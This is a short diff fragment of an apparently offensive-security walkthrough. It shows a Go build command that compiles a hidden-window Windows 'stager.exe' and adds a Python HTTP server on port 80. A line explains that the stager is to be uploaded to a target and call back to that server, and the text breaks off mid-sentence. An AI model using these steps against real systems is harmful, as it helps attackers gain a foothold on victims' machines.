@@ -826,6 +826,10 @@ Now ill compile it
 GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-H windowsgui" -o stager.exe stager.go
 ```
 
+This created the stager.exe
+
 ```python
-python
+python3 -m http.server 80
 ```
+
+So now its ready to be uploaded on to the target, once stager.exe is executed it should reach back to the web serve anf
